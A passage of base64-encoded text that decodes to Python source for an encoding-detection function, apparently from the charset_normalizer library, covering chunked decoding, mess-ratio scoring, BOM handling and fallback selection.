8gVHJ1ZSBpdCB3aWxsIGFsdGVyIHRoZSBsb2dnZXIgY29uZmlndXJhdGlvbiB0byBhZGQgYSBTdHJlYW1IYW5kbGVyIHRoYXQgaXMgc3VpdGFibGUgZm9yIGRlYnVnZ2luZy5cbiAgICBDdXN0b20gbG9nZ2luZyBmb3JtYXQgYW5kIGhhbmRsZXIgY2FuIGJlIHNldCBtYW51YWxseS5cbiAgICAiIiJcblxuICAgIGlmIG5vdCBpc2luc3RhbmNlKHNlcXVlbmNlcywgKGJ5dGVhcnJheSwgYnl0ZXMpKTpcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgIkV4cGVjdGVkIG9iamVjdCBvZiB0eXBlIGJ5dGVzIG9yIGJ5dGVhcnJheSwgZ290OiB7MH0iLmZvcm1hdChcbiAgICAgICAgICAgICAgICB0eXBlKHNlcXVlbmNlcylcbiAgICAgICAgICAgIClcbiAgICAgICAgKVxuXG4gICAgaWYgZXhwbGFpbjpcbiAgICAgICAgcHJldmlvdXNfbG9nZ2VyX2xldmVsID0gbG9nZ2VyLmxldmVsICAjIHR5cGU6IGludFxuICAgICAgICBsb2dnZXIuYWRkSGFuZGxlcihleHBsYWluX2hhbmRsZXIpXG4gICAgICAgIGxvZ2dlci5zZXRMZXZlbChUUkFDRSlcblxuICAgIGxlbmd0aCA9IGxlbihzZXF1ZW5jZXMpICAjIHR5cGU6IGludFxuXG4gICAgaWYgbGVuZ3RoID09IDA6XG4gICAgICAgIGxvZ2dlci5kZWJ1ZygiRW5jb2RpbmcgZGV0ZWN0aW9uIG9uIGVtcHR5IGJ5dGVzLCBhc3N1bWluZyB1dGZfOCBpbnRlbnRpb24uIilcbiAgICAgICAgaWYgZXhwbGFpbjpcbiAgICAgICAgICAgIGxvZ2dlci5yZW1vdmVIYW5kbGVyKGV4cGxhaW5faGFuZGxlcilcbiAgICAgICAgICAgIGxvZ2dlci5zZXRMZXZlbChwcmV2aW91c19sb2dnZXJfbGV2ZWwgb3IgbG9nZ2luZy5XQVJOSU5HKVxuICAgICAgICByZXR1cm4gQ2hhcnNldE1hdGNoZXMoW0NoYXJzZXRNYXRjaChzZXF1ZW5jZXMsICJ1dGZfOCIsIDAuMCwgRmFsc2UsIFtdLCAiIildKVxuXG4gICAgaWYgY3BfaXNvbGF0aW9uIGlzIG5vdCBOb25lOlxuICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgVFJBQ0UsXG4gICAgICAgICAgICAiY3BfaXNvbGF0aW9uIGlzIHNldC4gdXNlIHRoaXMgZmxhZyBmb3IgZGVidWdnaW5nIHB1cnBvc2UuICJcbiAgICAgICAgICAgICJsaW1pdGVkIGxpc3Qgb2YgZW5jb2RpbmcgYWxsb3dlZCA6ICVzLiIsXG4gICAgICAgICAgICAiLCAiLmpvaW4oY3BfaXNvbGF0aW9uKSxcbiAgICAgICAgKVxuICAgICAgICBjcF9pc29sYXRpb24gPSBbaWFuYV9uYW1lKGNwLCBGYWxzZSkgZm9yIGNwIGluIGNwX2lzb2xhdGlvbl1cbiAgICBlbHNlOlxuICAgICAgICBjcF9pc29sYXRpb24gPSBbXVxuXG4gICAgaWYgY3BfZXhjbHVzaW9uIGlzIG5vdCBOb25lOlxuICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgVFJBQ0UsXG4gICAgICAgICAgICAiY3BfZXhjbHVzaW9uIGlzIHNldC4gdXNlIHRoaXMgZmxhZyBmb3IgZGVidWdnaW5nIHB1cnBvc2UuICJcbiAgICAgICAgICAgICJsaW1pdGVkIGxpc3Qgb2YgZW5jb2RpbmcgZXhjbHVkZWQgOiAlcy4iLFxuICAgICAgICAgICAgIiwgIi5qb2luKGNwX2V4Y2x1c2lvbiksXG4gICAgICAgIClcbiAgICAgICAgY3BfZXhjbHVzaW9uID0gW2lhbmFfbmFtZShjcCwgRmFsc2UpIGZvciBjcCBpbiBjcF9leGNsdXNpb25dXG4gICAgZWxzZTpcbiAgICAgICAgY3BfZXhjbHVzaW9uID0gW11cblxuICAgIGlmIGxlbmd0aCA8PSAoY2h1bmtfc2l6ZSAqIHN0ZXBzKTpcbiAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgIm92ZXJyaWRlIHN0ZXBzICglaSkgYW5kIGNodW5rX3NpemUgKCVpKSBhcyBjb250ZW50IGRvZXMgbm90IGZpdCAoJWkgYnl0ZShzKSBnaXZlbikgcGFyYW1ldGVycy4iLFxuICAgICAgICAgICAgc3RlcHMsXG4gICAgICAgICAgICBjaHVua19zaXplLFxuICAgICAgICAgICAgbGVuZ3RoLFxuICAgICAgICApXG4gICAgICAgIHN0ZXBzID0gMVxuICAgICAgICBjaHVua19zaXplID0gbGVuZ3RoXG5cbiAgICBpZiBzdGVwcyA+IDEgYW5kIGxlbmd0aCAvIHN0ZXBzIDwgY2h1bmtfc2l6ZTpcbiAgICAgICAgY2h1bmtfc2l6ZSA9IGludChsZW5ndGggLyBzdGVwcylcblxuICAgIGlzX3Rvb19zbWFsbF9zZXF1ZW5jZSA9IGxlbihzZXF1ZW5jZXMpIDwgVE9PX1NNQUxMX1NFUVVFTkNFICAjIHR5cGU6IGJvb2xcbiAgICBpc190b29fbGFyZ2Vfc2VxdWVuY2UgPSBsZW4oc2VxdWVuY2VzKSA+PSBUT09fQklHX1NFUVVFTkNFICAjIHR5cGU6IGJvb2xcblxuICAgIGlmIGlzX3Rvb19zbWFsbF9zZXF1ZW5jZTpcbiAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgIlRyeWluZyB0byBkZXRlY3QgZW5jb2RpbmcgZnJvbSBhIHRpbnkgcG9ydGlvbiBvZiAoe30pIGJ5dGUocykuIi5mb3JtYXQoXG4gICAgICAgICAgICAgICAgbGVuZ3RoXG4gICAgICAgICAgICApLFxuICAgICAgICApXG4gICAgZWxpZiBpc190b29fbGFyZ2Vfc2VxdWVuY2U6XG4gICAgICAgIGxvZ2dlci5sb2coXG4gICAgICAgICAgICBUUkFDRSxcbiAgICAgICAgICAgICJVc2luZyBsYXp5IHN0ciBkZWNvZGluZyBiZWNhdXNlIHRoZSBwYXlsb2FkIGlzIHF1aXRlIGxhcmdlLCAoe30pIGJ5dGUocykuIi5mb3JtYXQoXG4gICAgICAgICAgICAgICAgbGVuZ3RoXG4gICAgICAgICAgICApLFxuICAgICAgICApXG5cbiAgICBwcmlvcml0aXplZF9lbmNvZGluZ3MgPSBbXSAgIyB0eXBlOiBMaXN0W3N0cl1cblxuICAgIHNwZWNpZmllZF9lbmNvZGluZyA9IChcbiAgICAgICAgYW55X3NwZWNpZmllZF9lbmNvZGluZyhzZXF1ZW5jZXMpIGlmIHByZWVtcHRpdmVfYmVoYXZpb3VyIGVsc2UgTm9uZVxuICAgICkgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuXG4gICAgaWYgc3BlY2lmaWVkX2VuY29kaW5nIGlzIG5vdCBOb25lOlxuICAgICAgICBwcmlvcml0aXplZF9lbmNvZGluZ3MuYXBwZW5kKHNwZWNpZmllZF9lbmNvZGluZylcbiAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgIkRldGVjdGVkIGRlY2xhcmF0aXZlIG1hcmsgaW4gc2VxdWVuY2UuIFByaW9yaXR5ICsxIGdpdmVuIGZvciAlcy4iLFxuICAgICAgICAgICAgc3BlY2lmaWVkX2VuY29kaW5nLFxuICAgICAgICApXG5cbiAgICB0ZXN0ZWQgPSBzZXQoKSAgIyB0eXBlOiBTZXRbc3RyXVxuICAgIHRlc3RlZF9idXRfaGFyZF9mYWlsdXJlID0gW10gICMgdHlwZTogTGlzdFtzdHJdXG4gICAgdGVzdGVkX2J1dF9zb2Z0X2ZhaWx1cmUgPSBbXSAgIyB0eXBlOiBMaXN0W3N0cl1cblxuICAgIGZhbGxiYWNrX2FzY2lpID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtDaGFyc2V0TWF0Y2hdXG4gICAgZmFsbGJhY2tfdTggPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0NoYXJzZXRNYXRjaF1cbiAgICBmYWxsYmFja19zcGVjaWZpZWQgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0NoYXJzZXRNYXRjaF1cblxuICAgIHJlc3VsdHMgPSBDaGFyc2V0TWF0Y2hlcygpICAjIHR5cGU6IENoYXJzZXRNYXRjaGVzXG5cbiAgICBzaWdfZW5jb2RpbmcsIHNpZ19wYXlsb2FkID0gaWRlbnRpZnlfc2lnX29yX2JvbShzZXF1ZW5jZXMpXG5cbiAgICBpZiBzaWdfZW5jb2RpbmcgaXMgbm90IE5vbmU6XG4gICAgICAgIHByaW9yaXRpemVkX2VuY29kaW5ncy5hcHBlbmQoc2lnX2VuY29kaW5nKVxuICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgVFJBQ0UsXG4gICAgICAgICAgICAiRGV0ZWN0ZWQgYSBTSUcgb3IgQk9NIG1hcmsgb24gZmlyc3QgJWkgYnl0ZShzKS4gUHJpb3JpdHkgKzEgZ2l2ZW4gZm9yICVzLiIsXG4gICAgICAgICAgICBsZW4oc2lnX3BheWxvYWQpLFxuICAgICAgICAgICAgc2lnX2VuY29kaW5nLFxuICAgICAgICApXG5cbiAgICBwcmlvcml0aXplZF9lbmNvZGluZ3MuYXBwZW5kKCJhc2NpaSIpXG5cbiAgICBpZiAidXRmXzgiIG5vdCBpbiBwcmlvcml0aXplZF9lbmNvZGluZ3M6XG4gICAgICAgIHByaW9yaXRpemVkX2VuY29kaW5ncy5hcHBlbmQoInV0Zl84IilcblxuICAgIGZvciBlbmNvZGluZ19pYW5hIGluIHByaW9yaXRpemVkX2VuY29kaW5ncyArIElBTkFfU1VQUE9SVEVEOlxuXG4gICAgICAgIGlmIGNwX2lzb2xhdGlvbiBhbmQgZW5jb2RpbmdfaWFuYSBub3QgaW4gY3BfaXNvbGF0aW9uOlxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICBpZiBjcF9leGNsdXNpb24gYW5kIGVuY29kaW5nX2lhbmEgaW4gY3BfZXhjbHVzaW9uOlxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICBpZiBlbmNvZGluZ19pYW5hIGluIHRlc3RlZDpcbiAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgdGVzdGVkLmFkZChlbmNvZGluZ19pYW5hKVxuXG4gICAgICAgIGRlY29kZWRfcGF5bG9hZCA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuICAgICAgICBib21fb3Jfc2lnX2F2YWlsYWJsZSA9IHNpZ19lbmNvZGluZyA9PSBlbmNvZGluZ19pYW5hICAjIHR5cGU6IGJvb2xcbiAgICAgICAgc3RyaXBfc2lnX29yX2JvbSA9IGJvbV9vcl9zaWdfYXZhaWxhYmxlIGFuZCBzaG91bGRfc3RyaXBfc2lnX29yX2JvbShcbiAgICAgICAgICAgIGVuY29kaW5nX2lhbmFcbiAgICAgICAgKSAgIyB0eXBlOiBib29sXG5cbiAgICAgICAgaWYgZW5jb2RpbmdfaWFuYSBpbiB7InV0Zl8xNiIsICJ1dGZfMzIifSBhbmQgbm90IGJvbV9vcl9zaWdfYXZhaWxhYmxlOlxuICAgICAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgICAgICBUUkFDRSxcbiAgICAgICAgICAgICAgICAiRW5jb2RpbmcgJXMgd29udCBiZSB0ZXN0ZWQgYXMtaXMgYmVjYXVzZSBpdCByZXF1aXJlIGEgQk9NLiBXaWxsIHRyeSBzb21lIHN1Yi1lbmNvZGVyIExFL0JFLiIsXG4gICAgICAgICAgICAgICAgZW5jb2RpbmdfaWFuYSxcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgaXNfbXVsdGlfYnl0ZV9kZWNvZGVyID0gaXNfbXVsdGlfYnl0ZV9lbmNvZGluZyhlbmNvZGluZ19pYW5hKSAgIyB0eXBlOiBib29sXG4gICAgICAgIGV4Y2VwdCAoTW9kdWxlTm90Rm91bmRFcnJvciwgSW1wb3J0RXJyb3IpOlxuICAgICAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgICAgICBUUkFDRSxcbiAgICAgICAgICAgICAgICAiRW5jb2RpbmcgJXMgZG9lcyBub3QgcHJvdmlkZSBhbiBJbmNyZW1lbnRhbERlY29kZXIiLFxuICAgICAgICAgICAgICAgIGVuY29kaW5nX2lhbmEsXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGlmIGlzX3Rvb19sYXJnZV9zZXF1ZW5jZSBhbmQgaXNfbXVsdGlfYnl0ZV9kZWNvZGVyIGlzIEZhbHNlOlxuICAgICAgICAgICAgICAgIHN0cihcbiAgICAgICAgICAgICAgICAgICAgc2VxdWVuY2VzWzogaW50KDUwZTQpXVxuICAgICAgICAgICAgICAgICAgICBpZiBzdHJpcF9zaWdfb3JfYm9tIGlzIEZhbHNlXG4gICAgICAgICAgICAgICAgICAgIGVsc2Ugc2VxdWVuY2VzW2xlbihzaWdfcGF5bG9hZCkgOiBpbnQoNTBlNCldLFxuICAgICAgICAgICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZ19pYW5hLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgZGVjb2RlZF9wYXlsb2FkID0gc3RyKFxuICAgICAgICAgICAgICAgICAgICBzZXF1ZW5jZXNcbiAgICAgICAgICAgICAgICAgICAgaWYgc3RyaXBfc2lnX29yX2JvbSBpcyBGYWxzZVxuICAgICAgICAgICAgICAgICAgICBlbHNlIHNlcXVlbmNlc1tsZW4oc2lnX3BheWxvYWQpIDpdLFxuICAgICAgICAgICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZ19pYW5hLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgZXhjZXB0IChVbmljb2RlRGVjb2RlRXJyb3IsIExvb2t1cEVycm9yKSBhcyBlOlxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZSwgTG9va3VwRXJyb3IpOlxuICAgICAgICAgICAgICAgIGxvZ2dlci5sb2coXG4gICAgICAgICAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgICAgICAgICAiQ29kZSBwYWdlICVzIGRvZXMgbm90IGZpdCBnaXZlbiBieXRlcyBzZXF1ZW5jZSBhdCBBTEwuICVzIixcbiAgICAgICAgICAgICAgICAgICAgZW5jb2RpbmdfaWFuYSxcbiAgICAgICAgICAgICAgICAgICAgc3RyKGUpLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgIHRlc3RlZF9idXRfaGFyZF9mYWlsdXJlLmFwcGVuZChlbmNvZGluZ19pYW5hKVxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICBzaW1pbGFyX3NvZnRfZmFpbHVyZV90ZXN0ID0gRmFsc2UgICMgdHlwZTogYm9vbFxuXG4gICAgICAgIGZvciBlbmNvZGluZ19zb2Z0X2ZhaWxlZCBpbiB0ZXN0ZWRfYnV0X3NvZnRfZmFpbHVyZTpcbiAgICAgICAgICAgIGlmIGlzX2NwX3NpbWlsYXIoZW5jb2RpbmdfaWFuYSwgZW5jb2Rpbmdfc29mdF9mYWlsZWQpOlxuICAgICAgICAgICAgICAgIHNpbWlsYXJfc29mdF9mYWlsdXJlX3Rlc3QgPSBUcnVlXG4gICAgICAgICAgICAgICAgYnJlYWtcblxuICAgICAgICBpZiBzaW1pbGFyX3NvZnRfZmFpbHVyZV90ZXN0OlxuICAgICAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgICAgICBUUkFDRSxcbiAgICAgICAgICAgICAgICAiJXMgaXMgZGVlbWVkIHRvbyBzaW1pbGFyIHRvIGNvZGUgcGFnZSAlcyBhbmQgd2FzIGNvbnNpZGVyIHVuc3VpdGVkIGFscmVhZHkuIENvbnRpbnVpbmchIixcbiAgICAgICAgICAgICAgICBlbmNvZGluZ19pYW5hLFxuICAgICAgICAgICAgICAgIGVuY29kaW5nX3NvZnRfZmFpbGVkLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICByXyA9IHJhbmdlKFxuICAgICAgICAgICAgMCBpZiBub3QgYm9tX29yX3NpZ19hdmFpbGFibGUgZWxzZSBsZW4oc2lnX3BheWxvYWQpLFxuICAgICAgICAgICAgbGVuZ3RoLFxuICAgICAgICAgICAgaW50KGxlbmd0aCAvIHN0ZXBzKSxcbiAgICAgICAgKVxuXG4gICAgICAgIG11bHRpX2J5dGVfYm9udXMgPSAoXG4gICAgICAgICAgICBpc19tdWx0aV9ieXRlX2RlY29kZXJcbiAgICAgICAgICAgIGFuZCBkZWNvZGVkX3BheWxvYWQgaXMgbm90IE5vbmVcbiAgICAgICAgICAgIGFuZCBsZW4oZGVjb2RlZF9wYXlsb2FkKSA8IGxlbmd0aFxuICAgICAgICApICAjIHR5cGU6IGJvb2xcblxuICAgICAgICBpZiBtdWx0aV9ieXRlX2JvbnVzOlxuICAgICAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgICAgICBUUkFDRSxcbiAgICAgICAgICAgICAgICAiQ29kZSBwYWdlICVzIGlzIGEgbXVsdGkgYnl0ZSBlbmNvZGluZyB0YWJsZSBhbmQgaXQgYXBwZWFyIHRoYXQgYXQgbGVhc3Qgb25lIGNoYXJhY3RlciAiXG4gICAgICAgICAgICAgICAgIndhcyBlbmNvZGVkIHVzaW5nIG4tYnl0ZXMuIixcbiAgICAgICAgICAgICAgICBlbmNvZGluZ19pYW5hLFxuICAgICAgICAgICAgKVxuXG4gICAgICAgIG1heF9jaHVua19nYXZlX3VwID0gaW50KGxlbihyXykgLyA0KSAgIyB0eXBlOiBpbnRcblxuICAgICAgICBtYXhfY2h1bmtfZ2F2ZV91cCA9IG1heChtYXhfY2h1bmtfZ2F2ZV91cCwgMilcbiAgICAgICAgZWFybHlfc3RvcF9jb3VudCA9IDAgICMgdHlwZTogaW50XG4gICAgICAgIGxhenlfc3RyX2hhcmRfZmFpbHVyZSA9IEZhbHNlXG5cbiAgICAgICAgbWRfY2h1bmtzID0gW10gICMgdHlwZTogTGlzdFtzdHJdXG4gICAgICAgIG1kX3JhdGlvcyA9IFtdXG5cbiAgICAgICAgZm9yIGkgaW4gcl86XG4gICAgICAgICAgICBpZiBpICsgY2h1bmtfc2l6ZSA+IGxlbmd0aCArIDg6XG4gICAgICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICAgICAgY3V0X3NlcXVlbmNlID0gc2VxdWVuY2VzW2kgOiBpICsgY2h1bmtfc2l6ZV1cblxuICAgICAgICAgICAgaWYgYm9tX29yX3NpZ19hdmFpbGFibGUgYW5kIHN0cmlwX3NpZ19vcl9ib20gaXMgRmFsc2U6XG4gICAgICAgICAgICAgICAgY3V0X3NlcXVlbmNlID0gc2lnX3BheWxvYWQgKyBjdXRfc2VxdWVuY2VcblxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGNodW5rID0gY3V0X3NlcXVlbmNlLmRlY29kZShcbiAgICAgICAgICAgICAgICAgICAgZW5jb2RpbmdfaWFuYSxcbiAgICAgICAgICAgICAgICAgICAgZXJyb3JzPSJpZ25vcmUiIGlmIGlzX211bHRpX2J5dGVfZGVjb2RlciBlbHNlICJzdHJpY3QiLFxuICAgICAgICAgICAgICAgICkgICMgdHlwZTogc3RyXG4gICAgICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yIGFzIGU6ICAjIExhenkgc3RyIGxvYWRpbmcgbWF5IGhhdmUgbWlzc2VkIHNvbWV0aGluZyB0aGVyZVxuICAgICAgICAgICAgICAgIGxvZ2dlci5sb2coXG4gICAgICAgICAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgICAgICAgICAiTGF6eVN0ciBMb2FkaW5nOiBBZnRlciBNRCBjaHVuayBkZWNvZGUsIGNvZGUgcGFnZSAlcyBkb2VzIG5vdCBmaXQgZ2l2ZW4gYnl0ZXMgc2VxdWVuY2UgYXQgQUxMLiAlcyIsXG4gICAgICAgICAgICAgICAgICAgIGVuY29kaW5nX2lhbmEsXG4gICAgICAgICAgICAgICAgICAgIHN0cihlKSxcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgZWFybHlfc3RvcF9jb3VudCA9IG1heF9jaHVua19nYXZlX3VwXG4gICAgICAgICAgICAgICAgbGF6eV9zdHJfaGFyZF9mYWlsdXJlID0gVHJ1ZVxuICAgICAgICAgICAgICAgIGJyZWFrXG5cbiAgICAgICAgICAgICMgbXVsdGktYnl0ZSBiYWQgY3V0dGluZyBkZXRlY3RvciBhbmQgYWRqdXN0bWVudFxuICAgICAgICAgICAgIyBub3QgdGhlIGNsZWFuZXN0IHdheSB0byBwZXJmb3JtIHRoYXQgZml4IGJ1dCBjbGV2ZXIgZW5vdWdoIGZvciBub3cuXG4gICAgICAgICAgICBpZiBpc19tdWx0aV9ieXRlX2RlY29kZXIgYW5kIGkgPiAwIGFuZCBzZXF1ZW5jZXNbaV0gPj0gMHg4MDpcblxuICAgICAgICAgICAgICAgIGNodW5rX3BhcnRpYWxfc2l6ZV9jaGsgPSBtaW4oY2h1bmtfc2l6ZSwgMTYpICAjIHR5cGU6IGludFxuXG4gICAgICAgICAgICAgICAgaWYgKFxuICAgICAgICAgICAgICAgICAgICBkZWNvZGVkX3BheWxvYWRcbiAgICAgICAgICAgICAgICAgICAgYW5kIGNodW5rWzpjaHVua19wYXJ0aWFsX3NpemVfY2hrXSBub3QgaW4gZGVjb2RlZF9wYXlsb2FkXG4gICAgICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICAgICAgZm9yIGogaW4gcmFuZ2UoaSwgaSAtIDQsIC0xKTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGN1dF9zZXF1ZW5jZSA9IHNlcXVlbmNlc1tqIDogaSArIGNodW5rX3NpemVdXG5cbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJvbV9vcl9zaWdfYXZhaWxhYmxlIGFuZCBzdHJpcF9zaWdfb3JfYm9tIGlzIEZhbHNlOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGN1dF9zZXF1ZW5jZSA9IHNpZ19wYXlsb2FkICsgY3V0X3NlcXVlbmNlXG5cbiAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rID0gY3V0X3NlcXVlbmNlLmRlY29kZShlbmNvZGluZ19pYW5hLCBlcnJvcnM9Imlnbm9yZSIpXG5cbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNodW5rWzpjaHVua19wYXJ0aWFsX3NpemVfY2hrXSBpbiBkZWNvZGVkX3BheWxvYWQ6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcblxuICAgICAgICAgICAgbWRfY2h1bmtzLmFwcGVuZChjaHVuaylcblxuICAgICAgICAgICAgbWRfcmF0aW9zLmFwcGVuZChtZXNzX3JhdGlvKGNodW5rLCB0aHJlc2hvbGQpKVxuXG4gICAgICAgICAgICBpZiBtZF9yYXRpb3NbLTFdID49IHRocmVzaG9sZDpcbiAgICAgICAgICAgICAgICBlYXJseV9zdG9wX2NvdW50ICs9IDFcblxuICAgICAgICAgICAgaWYgKGVhcmx5X3N0b3BfY291bnQgPj0gbWF4X2NodW5rX2dhdmVfdXApIG9yIChcbiAgICAgICAgICAgICAgICBib21fb3Jfc2lnX2F2YWlsYWJsZSBhbmQgc3RyaXBfc2lnX29yX2JvbSBpcyBGYWxzZVxuICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICBicmVha1xuXG4gICAgICAgICMgV2UgbWlnaHQgd2FudCB0byBjaGVjayB0aGUgc2VxdWVuY2UgYWdhaW4gd2l0aCB0aGUgd2hvbGUgY29udGVudFxuICAgICAgICAjIE9ubHkgaWYgaW5pdGlhbCBNRCB0ZXN0cyBwYXNzZXNcbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgbm90IGxhenlfc3RyX2hhcmRfZmFpbHVyZVxuICAgICAgICAgICAgYW5kIGlzX3Rvb19sYXJnZV9zZXF1ZW5jZVxuICAgICAgICAgICAgYW5kIG5vdCBpc19tdWx0aV9ieXRlX2RlY29kZXJcbiAgICAgICAgKTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBzZXF1ZW5jZXNbaW50KDUwZTMpIDpdLmRlY29kZShlbmNvZGluZ19pYW5hLCBlcnJvcnM9InN0cmljdCIpXG4gICAgICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yIGFzIGU6XG4gICAgICAgICAgICAgICAgbG9nZ2VyLmxvZyhcbiAgICAgICAgICAgICAgICAgICAgVFJBQ0UsXG4gICAgICAgICAgICAgICAgICAgICJMYXp5U3RyIExvYWRpbmc6IEFmdGVyIGZpbmFsIGxvb2t1cCwgY29kZSBwYWdlICVzIGRvZXMgbm90IGZpdCBnaXZlbiBieXRlcyBzZXF1ZW5jZSBhdCBBTEwuICVzIixcbiAgICAgICAgICAgICAgICAgICAgZW5jb2RpbmdfaWFuYSxcbiAgICAgICAgICAgICAgICAgICAgc3RyKGUpLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICB0ZXN0ZWRfYnV0X2hhcmRfZmFpbHVyZS5hcHBlbmQoZW5jb2RpbmdfaWFuYSlcbiAgICAgICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIG1lYW5fbWVzc19yYXRpbyA9IChcbiAgICAgICAgICAgIHN1bShtZF9yYXRpb3MpIC8gbGVuKG1kX3JhdGlvcykgaWYgbWRfcmF0aW9zIGVsc2UgMC4wXG4gICAgICAgICkgICMgdHlwZTogZmxvYXRcbiAgICAgICAgaWYgbWVhbl9tZXNzX3JhdGlvID49IHRocmVzaG9sZCBvciBlYXJseV9zdG9wX2NvdW50ID49IG1heF9jaHVua19nYXZlX3VwOlxuICAgICAgICAgICAgdGVzdGVkX2J1dF9zb2Z0X2ZhaWx1cmUuYXBwZW5kKGVuY29kaW5nX2lhbmEpXG4gICAgICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgICAgICIlcyB3YXMgZXhjbHVkZWQgYmVjYXVzZSBvZiBpbml0aWFsIGNoYW9zIHByb2JpbmcuIEdhdmUgdXAgJWkgdGltZShzKS4gIlxuICAgICAgICAgICAgICAgICJDb21wdXRlZCBtZWFuIGNoYW9zIGlzICVmICUlLiIsXG4gICAgICAgICAgICAgICAgZW5jb2RpbmdfaWFuYSxcbiAgICAgICAgICAgICAgICBlYXJseV9zdG9wX2NvdW50LFxuICAgICAgICAgICAgICAgIHJvdW5kKG1lYW5fbWVzc19yYXRpbyAqIDEwMCwgbmRpZ2l0cz0zKSxcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgICMgUHJlcGFyaW5nIHRob3NlIGZhbGxiYWNrcyBpbiBjYXNlIHdlIGdvdCBub3RoaW5nLlxuICAgICAgICAgICAgaWYgKFxuICAgICAgICAgICAgICAgIGVuY29kaW5nX2lhbmEgaW4gWyJhc2NpaSIsICJ1dGZfOCIsIHNwZWNpZmllZF9lbmNvZGluZ11cbiAgICAgICAgICAgICAgICBhbmQgbm90IGxhenlfc3RyX2hhcmRfZmFpbHVyZVxuICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICBmYWxsYmFja19lbnRyeSA9IENoYXJzZXRNYXRjaChcbiAgICAgICAgICAgICAgICAgICAgc2VxdWVuY2VzLCBlbmNvZGluZ19pYW5hLCB0aHJlc2hvbGQsIEZhbHNlLCBbXSwgZGVjb2RlZF9wYXlsb2FkXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIGlmIGVuY29kaW5nX2lhbmEgPT0gc3BlY2lmaWVkX2VuY29kaW5nOlxuICAgICAgICAgICAgICAgICAgICBmYWxsYmFja19zcGVjaWZpZWQgPSBmYWxsYmFja19lbnRyeVxuICAgICAgICAgICAgICAgIGVsaWYgZW5jb2RpbmdfaWFuYSA9PSAiYXNjaWkiOlxuICAgICAgICAgICAgICAgICAgICBmYWxsYmFja19hc2NpaSA9IGZhbGxiYWNrX2VudHJ5XG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgZmFsbGJhY2tfdTggPSBmYWxsYmFja19lbnRyeVxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgVFJBQ0UsXG4gICAgICAgICAgICAiJXMgcGFzc2VkIGluaXRpYWwgY2hhb3MgcHJvYmluZy4gTWVhbiBtZWFzdXJlZCBjaGFvcyBpcyAlZiAlJSIsXG4gICAgICAgICAgICBlbmNvZGluZ19pYW5hLFxuICAgICAgICAgICAgcm91bmQobWVhbl9tZXNzX3JhdGlvICogMTAwLCBuZGlnaXRzPTMpLFxuICAgICAgICApXG5cbiAgICAgICAgaWYgbm90IGlzX211bHRpX2J5dGVfZGVjb2RlcjpcbiAgICAgICAgICAgIHRhcmdldF9sYW5ndWFnZXMgPSBlbmNvZGluZ19sYW5ndWFnZXMoZW5jb2RpbmdfaWFuYSkgICMgdHlwZTogTGlzdFtzdHJdXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAg